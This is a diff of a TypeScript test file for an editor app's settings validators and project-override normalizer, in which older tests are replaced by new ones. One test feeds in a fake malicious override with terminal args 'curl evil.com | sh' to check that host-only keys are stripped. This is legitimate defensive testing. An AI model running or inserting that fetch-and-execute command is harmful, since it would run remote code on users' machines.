@@ -1,252 +1,75 @@
 import { describe, expect, test } from "bun:test";
 import {
-	ACCEPTED_IMAGE_TYPES,
-	base64EncodedLength,
 	clampToCodePoints,
 	DEFAULT_CONFIG,
-	FIRST_PROMPT_MAX_LENGTH,
-	firstPromptHead,
-	firstPromptOfTexts,
-	IMAGE_MAX_BASE64_BYTES,
-	isDelegationRunDetails,
-	isJbcentralConnected,
-	isJbcentralQuotaRefreshSeconds,
+	DEFAULT_FILES_EXCLUDE,
+	isEditorAutoSaveDelayMs,
+	isEditorCursorStyle,
+	isEditorFontSize,
+	isEditorLineNumbers,
+	isEditorRenderWhitespace,
+	isEditorTabSize,
+	isExplorerFileIcons,
+	isExplorerSortOrder,
+	isFilesExcludeList,
+	isGitCommitListMax,
+	isLineWidth,
 	isLocalePreference,
-	isPlanReviewResult,
-	isRetriedAttempt,
-	JBCENTRAL_QUOTA_REFRESH_SECONDS,
-	REQUEST_IMAGE_BASE64_BUDGET,
-	TODO_NUDGE_PREFIX,
+	isStringMap,
+	isSystemThemePair,
+	isTerminalCursorStyle,
+	isTerminalFontSize,
+	isTerminalScrollbackLines,
+	isTerminalShellArgs,
+	isTerminalWindowsShell,
+	isThemeMode,
+	normalizeProjectSettingsOverride,
+	normalizeThemePreference,
+	PROJECT_SETTINGS_PATH,
 } from "./domain";
-
-describe("isRetriedAttempt", () => {
-	const failed = { role: "assistant", stopReason: "error" };
-	const ok = { role: "assistant", stopReason: "stop" };
-	const userMsg = { role: "user" };
-
-	test("a failed assistant immediately followed by the retried assistant is superseded", () => {
-		expect(isRetriedAttempt([userMsg, failed, ok], 1)).toBe(true);
-	});
-
-	test("a failed assistant followed by a user message is the run's terminal failure — visible", () => {
-		expect(isRetriedAttempt([userMsg, failed, userMsg, ok], 1)).toBe(false);
-	});
-
-	test("a trailing failed assistant (nothing after it) stays visible", () => {
-		expect(isRetriedAttempt([userMsg, failed], 1)).toBe(false);
-	});
-
-	test("a non-error assistant is never a retried attempt, even when another assistant follows", () => {
-		expect(isRetriedAttempt([userMsg, ok, ok], 1)).toBe(false);
-	});
-
-	test("non-assistant roles and out-of-range indices are never retried attempts", () => {
-		expect(isRetriedAttempt([userMsg, failed, ok], 0)).toBe(false);
-		expect(isRetriedAttempt([userMsg, failed, ok], 7)).toBe(false);
-	});
-
-	test("an intervening toolResult breaks adjacency — pi's _prepareRetry re-runs the turn directly, so anything between the two means this was not a retry", () => {
-		const toolResult = { role: "toolResult" };
-		expect(isRetriedAttempt([userMsg, failed, toolResult, ok], 1)).toBe(false);
-	});
-});
-
-describe("isPlanReviewResult", () => {
-	const ok = {
-		itemId: "t_1",
-		itemTitle: "Wire login",
-		verdict: "request_changes",
-		summary: "one off-by-one",
-		findings: [{ id: "c_1", kind: "inline", body: "off-by-one", path: "a.ts", startLine: 3 }],
-	};
-
-	test("accepts a well-formed verdict with findings", () => {
-		expect(isPlanReviewResult(ok)).toBe(true);
-		expect(isPlanReviewResult({ ...ok, verdict: "approve", findings: [] })).toBe(true);
-	});
-
-	test("rejects bad verdict, missing fields, and malformed findings", () => {
-		expect(isPlanReviewResult({ ...ok, verdict: "maybe" })).toBe(false);
-		expect(isPlanReviewResult({ ...ok, itemId: 1 })).toBe(false);
-		expect(isPlanReviewResult({ ...ok, findings: "nope" })).toBe(false);
-		expect(isPlanReviewResult({ ...ok, findings: [{ id: "c_1" }] })).toBe(false);
-		expect(isPlanReviewResult(null)).toBe(false);
-	});
-
-	const finding = (extra: Record<string, unknown>) => ({
-		...ok,
-		findings: [{ id: "c_1", body: "b", ...extra }],
-	});
-
-	test("rejects a finding with an empty id/body or an unknown kind", () => {
-		expect(isPlanReviewResult({ ...ok, findings: [{ id: "", body: "b" }] })).toBe(false);
-		expect(isPlanReviewResult({ ...ok, findings: [{ id: "c_1", body: "" }] })).toBe(false);
-		expect(isPlanReviewResult(finding({ kind: "nope" }))).toBe(false);
-		expect(isPlanReviewResult(finding({ kind: "inline", path: "a.ts" }))).toBe(true);
-	});
-
-	test("rejects an incoherent or non-positive line range, and a line without a path", () => {
-		expect(isPlanReviewResult(finding({ path: "a.ts", startLine: 0 }))).toBe(false);
-		expect(isPlanReviewResult(finding({ path: "a.ts", startLine: 1.5 }))).toBe(false);
-		expect(isPlanReviewResult(finding({ startLine: 3 }))).toBe(false); // line with no path
-		expect(isPlanReviewResult(finding({ path: "a.ts", endLine: 3 }))).toBe(false); // endLine, no startLine
-		expect(isPlanReviewResult(finding({ path: "a.ts", startLine: 5, endLine: 3 }))).toBe(false);
-		expect(isPlanReviewResult(finding({ path: "a.ts", startLine: 3, endLine: 5 }))).toBe(true);
-	});
-
-	test("enforces cardinality: request_changes needs a finding, approve may have none", () => {
-		expect(isPlanReviewResult({ ...ok, verdict: "request_changes", findings: [] })).toBe(false);
-		expect(isPlanReviewResult({ ...ok, verdict: "approve", findings: [] })).toBe(true);
-	});
-});
 
 describe("config defaults", () => {
 	test("the shared custom layout-preset catalog starts empty", () => {
 		expect(DEFAULT_CONFIG.customLayoutPresets).toEqual([]);
 	});
 
-	test("the composer grows to half the chat by default", () => {
-		expect(DEFAULT_CONFIG).toHaveProperty("composerGrowthLimit", "half-chat");
-	});
-
-	test("JetBrains quota display defaults on with a bounded 30-second cadence", () => {
-		expect(JBCENTRAL_QUOTA_REFRESH_SECONDS).toEqual({ min: 1, max: 3600, default: 30 });
-		expect(DEFAULT_CONFIG).toHaveProperty("jbcentralQuotaEnabled", true);
-		expect(DEFAULT_CONFIG).toHaveProperty("jbcentralQuotaRefreshSeconds", 30);
-		for (const valid of [1, 30, 3600]) expect(isJbcentralQuotaRefreshSeconds(valid)).toBe(true);
-		for (const invalid of [0, 3601, 1.5, "30", null]) {
-			expect(isJbcentralQuotaRefreshSeconds(invalid)).toBe(false);
-		}
-	});
-
-	test("chat and file lines default to 120-symbol pane-bounded measures", () => {
+	test("file lines default to 120-symbol pane-bounded measures", () => {
 		expect(DEFAULT_CONFIG).toMatchObject({
-			chatLineWidth: 120,
 			fileLineWidth: 120,
-			chatLineWidthBounded: true,
 			fileLineWidthBounded: true,
 		});
 	});
-});
 
-describe("JetBrains Central health", () => {
-	test("only configured, signed-in, non-stopped Central is connected", () => {
-		expect(
-			isJbcentralConnected({
-				state: "configured",
-				version: "1.6.2",
-				signedOut: false,
-				proxyStopped: false,
-			}),
-		).toBe(true);
-		expect(
-			isJbcentralConnected({
-				state: "configured",
-				version: "1.6.2",
-				signedOut: true,
-				proxyStopped: false,
-			}),
-		).toBe(false);
-		expect(
-			isJbcentralConnected({
-				state: "configured",
-				version: "1.6.2",
-				signedOut: false,
-				proxyStopped: true,
-			}),
-		).toBe(false);
-		expect(isJbcentralConnected({ state: "supported", version: "1.6.2", signedOut: false })).toBe(
-			false,
-		);
-	});
-});
-
-describe("image payload ceiling", () => {
-	test("base64EncodedLength matches the real encoded length across quantum boundaries", () => {
-		for (const n of [0, 1, 2, 3, 4, 5, 100, 3 * 1024]) {
-			expect(base64EncodedLength(n)).toBe(Buffer.alloc(n).toString("base64").length);
-		}
-	});
-
-	test("the shared ceiling is pi's 4.5MB encoded-base64 cap (headroom under Anthropic's 5MB API limit)", () => {
-		expect(IMAGE_MAX_BASE64_BYTES).toBe(4.5 * 1024 * 1024);
-	});
-
-	test("the request-wide image budget leaves headroom under Anthropic's 32MB per-request cap", () => {
-		expect(REQUEST_IMAGE_BASE64_BUDGET).toBe(24 * 1024 * 1024);
-		expect(REQUEST_IMAGE_BASE64_BUDGET).toBeLessThan(32 * 1024 * 1024);
-		expect(REQUEST_IMAGE_BASE64_BUDGET).toBeGreaterThan(IMAGE_MAX_BASE64_BYTES * 4);
-	});
-
-	test("the provider-accepted media types are exactly png/jpeg/gif/webp", () => {
-		expect([...ACCEPTED_IMAGE_TYPES].sort()).toEqual([
-			"image/gif",
-			"image/jpeg",
-			"image/png",
-			"image/webp",
-		]);
-	});
-});
-
-describe("isDelegationRunDetails", () => {
-	const usage = {
-		input: 1,
-		output: 2,
-		cacheRead: 0,
-		cacheWrite: 0,
-		cost: 0.01,
-		turns: 1,
-		contextTokens: 3,
-	};
-	const valid = {
-		childSessionId: "child-1",
-		task: "map the repo",
-		status: "completed",
-		usage,
-		durationMs: 42,
-	};
-
-	test("accepts a complete details shape", () => {
-		expect(
-			isDelegationRunDetails({
-				...valid,
-				roleName: "researcher",
-				roleSource: "builtin",
-				model: "provider/model",
-				thinkingLevel: "high",
-				activity: "reading",
-			}),
-		).toBe(true);
-	});
-
-	test("rejects a thinking level outside pi's closed set", () => {
-		expect(isDelegationRunDetails({ ...valid, thinkingLevel: "turbo" })).toBe(false);
-		expect(isDelegationRunDetails({ ...valid, thinkingLevel: "toString" })).toBe(false);
-	});
-
-	test("accepts historical outcomes and optional user cancellation metadata", () => {
-		expect(isDelegationRunDetails(valid)).toBe(true);
-		expect(isDelegationRunDetails({ ...valid, status: "aborted", abortReason: "user" })).toBe(true);
-	});
-
-	test("rejects a status outside the closed union", () => {
-		expect(isDelegationRunDetails({ ...valid, status: "done" })).toBe(false);
-	});
-
-	test("rejects an empty usage object", () => {
-		expect(isDelegationRunDetails({ ...valid, usage: {} })).toBe(false);
-	});
-
-	test("rejects a missing durationMs and non-numeric usage fields", () => {
-		const { durationMs: _durationMs, ...noDuration } = valid;
-		expect(isDelegationRunDetails(noDuration)).toBe(false);
-		expect(isDelegationRunDetails({ ...valid, usage: { ...usage, cost: "0.01" } })).toBe(false);
-	});
-
-	test("rejects every optional display field when present with a non-string value", () => {
-		for (const field of ["roleName", "roleSource", "model", "activity", "abortReason"]) {
-			expect(isDelegationRunDetails({ ...valid, [field]: { malformed: true } })).toBe(false);
-		}
+	test("includes all 24 customization defaults", () => {
+		expect(PROJECT_SETTINGS_PATH).toBe(".realthing/settings.json");
+		expect(DEFAULT_CONFIG).toMatchObject({
+			uiFontFamily: "",
+			codeFontFamily: "",
+			explorerFileIcons: "filetype",
+			editorFontSize: 11,
+			editorTabSize: 4,
+			editorInsertSpaces: false,
+			editorMinimap: false,
+			editorLineNumbers: "on",
+			editorRenderWhitespace: "none",
+			editorCursorStyle: "line",
+			editorAutoSaveDelayMs: 700,
+			filesExclude: [...DEFAULT_FILES_EXCLUDE],
+			filesShowHidden: true,
+			explorerCompactFolders: true,
+			explorerSortOrder: "default",
+			filesAssociations: {},
+			terminalShellPath: "",
+			terminalShellArgs: [],
+			terminalFontSize: 13,
+			terminalCursorStyle: "block",
+			terminalCursorBlink: true,
+			terminalScrollbackLines: 5000,
+			gitCommitVerify: false,
+			gitCommitListMax: 200,
+			externalEditorCustomBin: "",
+			customKeybindings: {},
+		});
 	});
 });
 
@@ -260,48 +83,145 @@ test("isLocalePreference accepts system and canonical BCP-47 tags only", () => {
 	expect(isLocalePreference(7)).toBe(false);
 });
 
-describe("firstPromptHead", () => {
-	test("takes the first non-blank line, collapses whitespace and clamps on a code point", () => {
-		expect(firstPromptHead("\n\n  Fix   the\tauth bug  \nmore")).toBe("Fix the auth bug");
-		expect(firstPromptHead("x".repeat(500))?.length).toBe(FIRST_PROMPT_MAX_LENGTH);
-		expect(firstPromptHead(`${"x".repeat(FIRST_PROMPT_MAX_LENGTH - 1)}😀`)).toBe(
-			"x".repeat(FIRST_PROMPT_MAX_LENGTH - 1),
-		);
-		expect(clampToCodePoints("ab😀", 3)).toBe("ab");
-		expect(clampToCodePoints("ab😀", 4)).toBe("ab😀");
-		expect(firstPromptHead("")).toBeUndefined();
-		expect(firstPromptHead(undefined)).toBeUndefined();
+test("clampToCodePoints preserves surrogate pairs", () => {
+	expect(clampToCodePoints("ab😀", 3)).toBe("ab");
+	expect(clampToCodePoints("ab😀", 4)).toBe("ab😀");
+	expect(clampToCodePoints("abc", 10)).toBe("abc");
+});
+
+test("validators guard theme, line width, and terminal shell", () => {
+	expect(isThemeMode("fixed")).toBe(true);
+	expect(isThemeMode("system")).toBe(true);
+	expect(isThemeMode("invalid")).toBe(false);
+
+	expect(isSystemThemePair({ light: "light", dark: "dark" })).toBe(true);
+	expect(isSystemThemePair(null)).toBe(false);
+
+	expect(isLineWidth(120)).toBe(true);
+	expect(isLineWidth(10)).toBe(false);
+
+	expect(isTerminalWindowsShell("auto")).toBe(true);
+	expect(isTerminalWindowsShell("zsh")).toBe(false);
+
+	expect(normalizeThemePreference({ theme: "dark", themeMode: "system" })).toEqual({
+		theme: "dark",
+		themeMode: "fixed",
+	});
+});
+
+describe("customization validators & normalizeProjectSettingsOverride (4-Scenario)", () => {
+	test("Happy Case: accepts valid editor, explorer, terminal, git, and project override settings", () => {
+		expect(isEditorFontSize(14)).toBe(true);
+		expect(isEditorTabSize(2)).toBe(true);
+		expect(isEditorLineNumbers("relative")).toBe(true);
+		expect(isEditorRenderWhitespace("boundary")).toBe(true);
+		expect(isEditorCursorStyle("block")).toBe(true);
+		expect(isEditorAutoSaveDelayMs(1000)).toBe(true);
+		expect(isExplorerSortOrder("filesFirst")).toBe(true);
+		expect(isExplorerFileIcons("minimal")).toBe(true);
+		expect(isFilesExcludeList(["dist", "coverage"])).toBe(true);
+		expect(isStringMap({ ".mdx": "text/markdown" })).toBe(true);
+		expect(isTerminalFontSize(16)).toBe(true);
+		expect(isTerminalCursorStyle("bar")).toBe(true);
+		expect(isTerminalScrollbackLines(10000)).toBe(true);
+		expect(isTerminalShellArgs(["-l", "-i"])).toBe(true);
+		expect(isGitCommitListMax(500)).toBe(true);
+
+		const override = normalizeProjectSettingsOverride({
+			fileLineWidth: 100,
+			fileLineWidthBounded: false,
+			editorFontSize: 14,
+			editorTabSize: 2,
+			editorInsertSpaces: true,
+			editorMinimap: true,
+			editorLineNumbers: "relative",
+			editorRenderWhitespace: "all",
+			editorCursorStyle: "underline",
+			editorAutoSaveDelayMs: 500,
+			filesExclude: ["dist"],
+			filesShowHidden: false,
+			explorerCompactFolders: false,
+			explorerSortOrder: "type",
+			filesAssociations: { ".mdx": "text/markdown" },
+			gitCommitVerify: true,
+			gitCommitListMax: 300,
+		});
+		expect(override).toEqual({
+			fileLineWidth: 100,
+			fileLineWidthBounded: false,
+			editorFontSize: 14,
+			editorTabSize: 2,
+			editorInsertSpaces: true,
+			editorMinimap: true,
+			editorLineNumbers: "relative",
+			editorRenderWhitespace: "all",
+			editorCursorStyle: "underline",
+			editorAutoSaveDelayMs: 500,
+			filesExclude: ["dist"],
+			filesShowHidden: false,
+			explorerCompactFolders: false,
+			explorerSortOrder: "type",
+			filesAssociations: { ".mdx": "text/markdown" },
+			gitCommitVerify: true,
+			gitCommitListMax: 300,
+		});
 	});
 
-	test("a skill block or /skill: command reads as its request or its name, a package reads as nothing", () => {
-		const block = '<skill name="setting-up-a-project" location="/s/SKILL.md">\nbody\n</skill>';
-		expect(firstPromptHead(`${block}\n\nAnd also the docs`)).toBe("And also the docs");
-		expect(firstPromptHead(block)).toBe("/skill:setting-up-a-project");
-		expect(firstPromptHead("/skill:setting-up-a-project And also the docs")).toBe(
-			"And also the docs",
-		);
-		expect(firstPromptHead("/skill:setting-up-a-project")).toBe("/skill:setting-up-a-project");
-		expect(firstPromptHead('<review scope="branch">\n<comment …>\n</review>')).toBeUndefined();
+	test("Exception Case: rejects out-of-range numbers, invalid enums, and non-object overrides", () => {
+		expect(isEditorFontSize(8)).toBe(false);
+		expect(isEditorFontSize(33)).toBe(false);
+		expect(isEditorFontSize(12.5)).toBe(false);
+		expect(isEditorTabSize(3)).toBe(false);
+		expect(isEditorLineNumbers("invalid")).toBe(false);
+		expect(isEditorRenderWhitespace("invalid")).toBe(false);
+		expect(isEditorCursorStyle("invalid")).toBe(false);
+		expect(isEditorAutoSaveDelayMs(-1)).toBe(false);
+		expect(isEditorAutoSaveDelayMs(10001)).toBe(false);
+		expect(isExplorerSortOrder("random")).toBe(false);
+		expect(isExplorerFileIcons("vivid")).toBe(false);
+		expect(isFilesExcludeList([""])).toBe(false);
+		expect(isFilesExcludeList(["   "])).toBe(false);
+		expect(isStringMap(null)).toBe(false);
+		expect(isStringMap([])).toBe(false);
+		expect(isTerminalFontSize(5)).toBe(false);
+		expect(isTerminalCursorStyle("line")).toBe(false);
+		expect(isTerminalScrollbackLines(100)).toBe(false);
+		expect(isTerminalShellArgs([123])).toBe(false);
+		expect(isGitCommitListMax(10)).toBe(false);
+
+		expect(normalizeProjectSettingsOverride(null)).toEqual({});
+		expect(normalizeProjectSettingsOverride("not-an-object")).toEqual({});
+		expect(normalizeProjectSettingsOverride([])).toEqual({});
 		expect(
-			firstPromptHead('<review id="r1" branch="b" base="main@abc" comments="2">\n<comment …>'),
-		).toBeUndefined();
-		expect(firstPromptHead("<Button> loses focus after submit")).toBe(
-			"<Button> loses focus after submit",
-		);
-		expect(firstPromptHead(`${"word ".repeat(2_000)}`)?.length).toBe(FIRST_PROMPT_MAX_LENGTH);
+			normalizeProjectSettingsOverride({
+				editorFontSize: 999,
+				editorTabSize: 3,
+				gitCommitListMax: -5,
+			}),
+		).toEqual({});
 	});
 
-	test("firstPromptOfTexts skips control messages and texts without a head", () => {
-		expect(
-			firstPromptOfTexts([
-				`${TODO_NUDGE_PREFIX}A TODO was added`,
-				"",
-				'<review scope="branch">\n<comment …>',
-				"  The real prompt\nsecond line",
-				"later",
-			]),
-		).toBe("The real prompt");
-		expect(firstPromptOfTexts([])).toBeUndefined();
-		expect(firstPromptOfTexts(['<review scope="branch">'])).toBeUndefined();
+	test("Hacking Case: blocks oversized arrays, oversized strings, and prototype pollution payloads", () => {
+		expect(isFilesExcludeList(Array.from({ length: 129 }, (_, i) => `f${i}`))).toBe(false);
+		expect(isFilesExcludeList(["a".repeat(201)])).toBe(false);
+		expect(isTerminalShellArgs(Array.from({ length: 33 }, () => "-v"))).toBe(false);
+		expect(isTerminalShellArgs(["a".repeat(201)])).toBe(false);
+		expect(isStringMap({ ["k".repeat(101)]: "v" })).toBe(false);
+		expect(isStringMap({ k: "v".repeat(201) })).toBe(false);
+	});
+
+	test("403 / Unauthorized Keys Case: normalizeProjectSettingsOverride strips non-project-scopable host keys like terminalShellPath and externalEditorCustomBin", () => {
+		const raw = {
+			editorTabSize: 2,
+			terminalShellPath: "/bin/evil-shell",
+			terminalShellArgs: ["-c", "curl evil.com | sh"],
+			externalEditorCustomBin: "/tmp/exploit",
+			theme: "hacked",
+		};
+		const normalized = normalizeProjectSettingsOverride(raw);
+		expect(normalized).toEqual({ editorTabSize: 2 });
+		expect("terminalShellPath" in normalized).toBe(false);
+		expect("terminalShellArgs" in normalized).toBe(false);
+		expect("externalEditorCustomBin" in normalized).toBe(false);
 	});
 });
